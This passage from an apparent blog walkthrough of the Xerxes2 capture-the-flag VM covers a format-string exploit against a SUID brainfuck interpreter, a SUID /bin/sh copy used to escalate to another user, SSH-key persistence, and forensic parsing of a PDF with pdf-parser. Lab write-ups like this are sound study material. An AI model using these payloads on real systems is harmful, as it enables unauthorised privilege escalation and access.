</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>cp /bin/sh /tmp/shell
</span><span class='line'>chmod <span class="m">4777</span> /tmp/shell
</span></code></pre></td></tr></table></div></figure>


<p>chmod +x the file so it is executable, and then run the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;\x48\x9a\x04\x08&#39; + &#39;%8186u%16\$hn;\/tmp\/123.sh\x00&#39;&quot;</span><span class="k">)</span> <span class="p">|</span> /opt/bf <span class="s1">&#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,#&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,#&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>It will probably throw an error, but the shell script will run and you&rsquo;ll end up with a copy of /bin/sh in /tmp, with the SUID bit set, which when run will elevate you to the polito user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>1075339252delacroix@xerxes2:~<span class="nv">$ </span>ls -l /tmp
</span><span class='line'>total 148
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">53</span> Aug  <span class="m">6</span> 12:07 file1
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">61</span> Aug  <span class="m">6</span> 13:03 file2
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">49</span> Aug  <span class="m">6</span> 12:24 file3
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">49</span> Aug  <span class="m">6</span> 12:27 file4
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix     <span class="m">5</span> Aug  <span class="m">6</span> 12:31 file5
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix   <span class="m">253</span> Aug  <span class="m">6</span> 12:50 file6
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">73</span> Aug  <span class="m">6</span> 13:37 file7
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">49</span> Aug  <span class="m">6</span> 13:59 file8
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">44</span> Aug  <span class="m">6</span> 13:59 file9
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">11</span> Aug  <span class="m">6</span> 14:15 filea
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">11</span> Aug  <span class="m">6</span> 14:13 fileb
</span><span class='line'>-rw-r--r-- <span class="m">1</span> delacroix delacroix    <span class="m">11</span> Aug  <span class="m">6</span> 14:13 filec
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> delacroix delacroix    <span class="m">55</span> Aug  <span class="m">6</span> 16:15 gah.sh
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> polito    polito    <span class="m">97284</span> Aug  <span class="m">6</span> 16:15 shell
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/tmp/shell
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span>,1002<span class="o">(</span>delacroix<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I then did the same deal here - echo&rsquo;d my SSH public key to ~/.ssh/authorized_keys and SSH&rsquo;d in as polito.</p>

<p>As a side note, I spoke to barrebas on IRC about my exploit route and he was able to refine it further</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[00:15:55]  &lt;barrebas&gt; sweet your exploit is much smaller than mine, nice!
</span><span class='line'>[00:16:01]  &lt;recrudesce&gt;    really ???
</span><span class='line'>[00:16:19]  &lt;barrebas&gt;  yeah, i didn&#39;t use direct parameter addressing
</span><span class='line'>[00:16:33]  &lt;barrebas&gt;  and i wrote 4 bytes instead of 2, yours is smarter
</span><span class='line'>[00:16:54]  &lt;recrudesce&gt;    that&#39;s taken me hours
</span><span class='line'>[00:25:48]  &lt;barrebas&gt;  a bit shorter still:
</span><span class='line'>[00:25:50]  &lt;barrebas&gt;  python -c &quot;print &#39;\x48\x9a\x04\x08&#39; + &#39;;\/tmp\/123.sh;%8173u%16\$hn&#39;&quot; | /opt/bf &#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,##&#39;
</span><span class='line'>[00:26:08]  &lt;recrudesce&gt;    you know what, that looks like another one i did, but only slightly
</span><span class='line'>[00:26:36]  &lt;barrebas&gt;  anyway, nice work
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://www.playandroid.com/wp-content/uploads/2012/04/U-Mad-Bro.jpg" alt="" /></p>

<hr />

<h2>Wandering the Operations Deck with Janice</h2>

<p><img src="http://img3.wikia.nocookie.net/__cb20111214193431/shodan/images/2/22/Janice_Polito_%28portrait%29.png" alt="" /></p>

<p>Say hello to <a href="http://shodan.wikia.com/wiki/Janice_Polito">Janice Polito</a>, she&rsquo;s got a smirk on her hasn&rsquo;t she ?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh polito@192.168.0.102
</span><span class='line'>
</span><span class='line'>Welcome to xerxes2.
</span><span class='line'>      XERXES wishes you
</span><span class='line'>       a pleasant stay.
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM</span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span>
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 172960
</span><span class='line'>-rw-r--r-- <span class="m">1</span> polito polito    <span class="m">142564</span> Jul <span class="m">16</span> 10:57 audio.txt
</span><span class='line'>-rw-r--r-- <span class="m">1</span> polito polito  <span class="m">44813850</span> Jul <span class="m">16</span> 12:17 dump.gpg
</span><span class='line'>-rw-r--r-- <span class="m">1</span> polito polito     <span class="m">27591</span> Jul <span class="m">16</span> 12:19 polito.pdf
</span></code></pre></td></tr></table></div></figure>


<p>OK, so in /home/polito we have a PDF, a PGP&rsquo;d file and an audio.txt file.  This audio.txt is being served by nc on port 4444 - surprise !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ps aux <span class="p">|</span> grep 4444
</span><span class='line'>polito    <span class="m">2175</span>  0.0  0.1   <span class="m">1936</span>   <span class="m">568</span> ?        Ss   Aug06   0:00 /bin/sh -c <span class="k">while</span> <span class="nb">true</span> <span class="p">;</span> <span class="k">do</span> nc -l -p <span class="m">4444</span> &lt; /home/polito/audio.txt <span class="p">;</span> <span class="k">done</span>
</span><span class='line'>polito   <span class="m">19481</span>  0.0  0.1   <span class="m">1904</span>   <span class="m">640</span> ?        S    08:56   0:00 nc -l -p 4444
</span></code></pre></td></tr></table></div></figure>


<p>Sit comfortably, children, for I have a story to tell about this PDF. I transferred it to my laptop, and opened it&hellip; a blank PDF. I decided there must be something hidden in the file. Now, I must admit my PDF forensics skills are somewhat lacking. However, people like Didier Stevens make life a little easier with their little Python tools such as <a href="http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser</a>.</p>

<p>I used pdf-parser to see what the PDF contained</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# pdf-parser polito.pdf
</span><span class='line'>PDF Comment <span class="s1">&#39;%PDF-1.5\n&#39;</span>
</span><span class='line'>
</span><span class='line'>obj <span class="m">999</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'> Contains stream
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">3</span> 0
</span><span class='line'> Type: /Page
</span><span class='line'> Referencing: <span class="m">4</span> <span class="m">0</span> R, <span class="m">2</span> <span class="m">0</span> R, <span class="m">7</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /Page
</span><span class='line'>    /Contents <span class="m">4</span> <span class="m">0</span> R
</span><span class='line'>    /Resources <span class="m">2</span> <span class="m">0</span> R
</span><span class='line'>    /MediaBox <span class="o">[</span><span class="m">0</span> <span class="m">0</span> 595.276 841.89<span class="o">]</span>
</span><span class='line'>    /Parent <span class="m">7</span> <span class="m">0</span> R
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">1</span> 0
</span><span class='line'> Type: /XObject
</span><span class='line'> Referencing: <span class="m">8</span> <span class="m">0</span> R
</span><span class='line'> Contains stream
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /XObject
</span><span class='line'>    /Subtype /Image
</span><span class='line'>    /Width 200
</span><span class='line'>    /Height 200
</span><span class='line'>    /BitsPerComponent 1
</span><span class='line'>    /ColorSpace <span class="o">[</span>/Indexed /DeviceRGB <span class="m">1</span> <span class="m">8</span> <span class="m">0</span> R<span class="o">]</span>
</span><span class='line'>    /Length 301
</span><span class='line'>    /Filter /FlateDecode
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">8</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'> Contains stream
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Length 14
</span><span class='line'>    /Filter /FlateDecode
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">2</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing: <span class="m">5</span> <span class="m">0</span> R, <span class="m">6</span> <span class="m">0</span> R, <span class="m">1</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Font
</span><span class='line'>      &lt;&lt;
</span><span class='line'>        /F15 <span class="m">5</span> <span class="m">0</span> R
</span><span class='line'>        /F8 <span class="m">6</span> <span class="m">0</span> R
</span><span class='line'>      &gt;&gt;
</span><span class='line'>    /XObject
</span><span class='line'>      &lt;&lt;
</span><span class='line'>        /Im1 <span class="m">1</span> <span class="m">0</span> R
</span><span class='line'>      &gt;&gt;
</span><span class='line'>    /ProcSet <span class="o">[</span> /PDF /Text /ImageC /ImageI <span class="o">]</span>
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">9</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">10</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">11</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'> Contains stream
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Length1 1462
</span><span class='line'>    /Length2 9126
</span><span class='line'>    /Length3 0
</span><span class='line'>    /Length 10107
</span><span class='line'>    /Filter /FlateDecode
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">12</span> 0
</span><span class='line'> Type: /FontDescriptor
</span><span class='line'> Referencing: <span class="m">11</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /FontDescriptor
</span><span class='line'>    /FontName /WEGFEK+CMR10
</span><span class='line'>    /Flags 4
</span><span class='line'>    /FontBBox <span class="o">[</span>-40 -250 <span class="m">1009</span> 750<span class="o">]</span>
</span><span class='line'>    /Ascent 694
</span><span class='line'>    /CapHeight 683
</span><span class='line'>    /Descent -194
</span><span class='line'>    /ItalicAngle 0
</span><span class='line'>    /StemV 69
</span><span class='line'>    /XHeight 431
</span><span class='line'>    /CharSet <span class="o">(</span>
</span><span class='line'>    /R /b
</span><span class='line'>    /comma /e
</span><span class='line'>    /m /r<span class="o">)</span>
</span><span class='line'>    /FontFile <span class="m">11</span> <span class="m">0</span> R
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">13</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'> Contains stream
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Length1 1858
</span><span class='line'>    /Length2 11943
</span><span class='line'>    /Length3 0
</span><span class='line'>    /Length 13097
</span><span class='line'>    /Filter /FlateDecode
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">14</span> 0
</span><span class='line'> Type: /FontDescriptor
</span><span class='line'> Referencing: <span class="m">13</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /FontDescriptor
</span><span class='line'>    /FontName /ZTMOYO+CMTT10
</span><span class='line'>    /Flags 4
</span><span class='line'>    /FontBBox <span class="o">[</span>-4 -233 <span class="m">537</span> 696<span class="o">]</span>
</span><span class='line'>    /Ascent 611
</span><span class='line'>    /CapHeight 611
</span><span class='line'>    /Descent -222
</span><span class='line'>    /ItalicAngle 0
</span><span class='line'>    /StemV 69
</span><span class='line'>    /XHeight 431
</span><span class='line'>    /CharSet <span class="o">(</span>
</span><span class='line'>    /F /H
</span><span class='line'>    /I /Y
</span><span class='line'>    /a /b
</span><span class='line'>    /c /comma
</span><span class='line'>    /d /e
</span><span class='line'>    /f /g
</span><span class='line'>    /h /i
</span><span class='line'>    /k /l
</span><span class='line'>    /m /n
</span><span class='line'>    /o /p
</span><span class='line'>    /period /question
</span><span class='line'>    /quoteright /r
</span><span class='line'>    /s /slash
</span><span class='line'>    /t /u
</span><span class='line'>    /v /w
</span><span class='line'>    /y <span class="o">)</span>
</span><span class='line'>    /FontFile <span class="m">13</span> <span class="m">0</span> R
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">6</span> 0
</span><span class='line'> Type: /Font
</span><span class='line'> Referencing: <span class="m">12</span> <span class="m">0</span> R, <span class="m">9</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /Font
</span><span class='line'>    /Subtype /Type1
</span><span class='line'>    /BaseFont /WEGFEK+CMR10
</span><span class='line'>    /FontDescriptor <span class="m">12</span> <span class="m">0</span> R
</span><span class='line'>    /FirstChar 44
</span><span class='line'>    /LastChar 114
</span><span class='line'>    /Widths <span class="m">9</span> <span class="m">0</span> R
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">5</span> 0
</span><span class='line'> Type: /Font
</span><span class='line'> Referencing: <span class="m">14</span> <span class="m">0</span> R, <span class="m">10</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /Font
</span><span class='line'>    /Subtype /Type1
</span><span class='line'>    /BaseFont /ZTMOYO+CMTT10
</span><span class='line'>    /FontDescriptor <span class="m">14</span> <span class="m">0</span> R
</span><span class='line'>    /FirstChar 39
</span><span class='line'>    /LastChar 121
</span><span class='line'>    /Widths <span class="m">10</span> <span class="m">0</span> R
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">7</span> 0
</span><span class='line'> Type: /Pages
</span><span class='line'> Referencing: <span class="m">3</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /Pages
</span><span class='line'>    /Count 1
</span><span class='line'>    /Kids <span class="o">[</span><span class="m">3</span> <span class="m">0</span> R<span class="o">]</span>
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">15</span> 0
</span><span class='line'> Type: /Catalog
</span><span class='line'> Referencing: <span class="m">7</span> <span class="m">0</span> R
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Type /Catalog
</span><span class='line'>    /Pages <span class="m">7</span> <span class="m">0</span> R
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>obj <span class="m">16</span> 0
</span><span class='line'> Type:
</span><span class='line'> Referencing:
</span><span class='line'>
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Producer <span class="o">(</span>pdfTeX-1.40.13<span class="o">)</span>
</span><span class='line'>    /Creator <span class="o">(</span>TeX<span class="o">)</span>
</span><span class='line'>    /CreationDate <span class="s2">&quot;(D:20140605220405+02&#39;00&#39;)&quot;</span>
</span><span class='line'>    /ModDate <span class="s2">&quot;(D:20140605220405+02&#39;00&#39;)&quot;</span>
</span><span class='line'>    /Trapped /False
</span><span class='line'>    /PTEX.Fullbanner <span class="o">(</span>This is pdfTeX, Version 3.1415926-2.4-1.40.13 <span class="o">(</span>TeX Live 2012
</span><span class='line'>    /Debian <span class="o">)</span> kpathsea version 6.1.0<span class="o">)</span>
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>xref
</span><span class='line'>
</span><span class='line'>trailer
</span><span class='line'>  &lt;&lt;
</span><span class='line'>    /Size 17
</span><span class='line'>    /Root 150R
</span><span class='line'>    /Info 160R
</span><span class='line'>    /ID <span class="o">[</span>&lt;F11EC07203BA4D86560A32F64766D9D3&gt;&lt;F11EC07203BA4D86560A32F64766D9D3&gt;<span class="o">]</span>
</span><span class='line'>  &gt;&gt;
</span><span class='line'>
</span><span class='line'>startxref 26582
</span><span class='line'>
</span><span class='line'>PDF Comment <span class="s1">&#39;%%EOF\n&#39;</span>
</span><span class='line'>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>So, a couple of objects, 2 fonts and an image. The ID&rsquo;s of interest are 999, 1, and 8. pdf-parser can be used to extract objects, so I extracted them all. 1 and 4 resulted in nothing interesting, 8 resulted in a text file that read &ldquo;foo&rdquo;, but 999 extracted as a file that looked like a PDF without headers.</p>

